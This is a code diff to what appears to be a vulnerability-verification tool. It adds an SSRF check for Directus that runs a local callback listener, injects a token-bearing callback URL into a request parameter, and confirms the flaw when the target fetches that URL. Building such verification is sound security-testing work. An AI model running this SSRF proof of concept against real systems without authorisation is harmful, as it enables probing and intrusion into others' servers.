@@ -248,9 +248,9 @@ def verify_directus_web_cve(
         # Extra grace period for DB migrations to complete
         time.sleep(3)
 
-        # Auth (always needed for chain; also when auth_required=True)
+        # Auth (always needed for SSRF/chain; also when auth_required=True)
         bearer = None
-        if auth_required or request_chain:
+        if auth_required or request_chain or vuln_class == "ssrf":
             bearer = _get_directus_token(base_url, step)
 
         # Multi-step request chain takes priority over single request
@@ -266,7 +266,94 @@ def verify_directus_web_cve(
                 step("  directus: VERIFICADO (chain)")
             return res
 
-        # Single-request PoC
+        # SSRF: use a callback listener on the host, since Directus runs with port mapping
+        # (no custom Docker network), the listener binds to the host port and Directus
+        # reaches it via the Docker bridge gateway (172.17.0.1 or host.docker.internal).
+        if vuln_class == "ssrf":
+            import secrets as _ssrf_sec, socket as _ssrf_sock, threading as _ssrf_thr
+            _ssrf_token = _ssrf_sec.token_hex(10)
+            _ssrf_port = 19876
+            _ssrf_received: list = []
+
+            class _SsrfHandler:
+                def __init__(self):
+                    self.received = False
+
+            class _ThreadHTTP:
+                def __init__(self, port: int, token: str, received: list):
+                    self._port = port
+                    self._token = token
+                    self._received = received
+                    self._srv: Optional[object] = None
+
+                def start(self):
+                    import http.server
+                    _tok = self._token
+                    _recv = self._received
+
+                    class _H(http.server.BaseHTTPRequestHandler):
+                        def do_GET(self):
+                            self.send_response(200)
+                            self.send_header("Content-Type", "text/html")
+                            self.end_headers()
+                            self.wfile.write(b"<html><body>ok</body></html>")
+                            _recv.append(self.path)
+
+                        def log_message(self, *a):
+                            pass
+
+                    import socketserver
+                    self._srv = socketserver.TCPServer(("0.0.0.0", self._port), _H)
+                    self._srv.socket.setsockopt(1, 2, 1)  # SO_REUSEADDR
+                    self._srv.timeout = 1
+                    for _ in range(50):
+                        self._srv.handle_request()
+                        if self._received:
+                            break
+
+            _listener = _ThreadHTTP(_ssrf_port, _ssrf_token, _ssrf_received)
+            _t = _ssrf_thr.Thread(target=_listener.start, daemon=True)
+            _t.start()
+            # Docker bridge gateway — reachable from inside the container
+            _gw = "172.17.0.1"
+            callback_url = f"http://{_gw}:{_ssrf_port}/?token={_ssrf_token}"
+            # Build SSRF params: replace url/ssrf_param with callback
+            from .wpverify import _URL_HINTS as _DIR_URL_HINTS
+            from .genericverify import _pick_param as _dir_pick
+            _url_p = _dir_pick(parameters or [], _DIR_URL_HINTS) or "url"
+            _ssrf_params = dict(parameters) if isinstance(parameters, dict) else {}
+            if isinstance(parameters, list):
+                _ssrf_params = {k: "" for k in parameters}
+            _ssrf_params[_url_p] = callback_url
+            _ssrf_body = __import__("json").dumps(_ssrf_params)
+            _ssrf_hdrs = {"Content-Type": "application/json"}
+            if bearer:
+                _ssrf_hdrs["Authorization"] = bearer
+            step(f"  directus/ssrf: POST {endpoint} url_param={_url_p!r} → {callback_url[:60]}")
+            try:
+                _r_ssrf = _http_request(http_method.upper() or "POST",
+                                        base_url + endpoint,
+                                        data=_ssrf_body, headers=_ssrf_hdrs, timeout=15)
+                res.evidence["ssrf_status"] = _r_ssrf.status_code
+                res.evidence["ssrf_body"] = (_r_ssrf.text or "")[:200]
+            except Exception as _e:
+                res.evidence["ssrf_error"] = str(_e)[:100]
+            _t.join(timeout=20)
+            if _ssrf_received:
+                res.verified = True
+                res.ok = True
+                res.confidence = "confirmed"
+                res.detail = f"SSRF VERIFICADO: Directus fetched callback (token={_ssrf_token[:8]}…)"
+                res.evidence["ssrf_callback_path"] = _ssrf_received[0][:100]
+                step("  directus/ssrf: VERIFICADO — callback recibido")
+            else:
+                res.ok = True
+                res.detail = (f"SSRF no confirmado: no callback en 20s "
+                              f"(HTTP {res.evidence.get('ssrf_status', '?')})")
+                step("  directus/ssrf: no callback recibido en 20s")
+            return res
+
+        # Single-request PoC (non-SSRF)
         target_url = base_url + endpoint
         headers = {}
         if bearer:
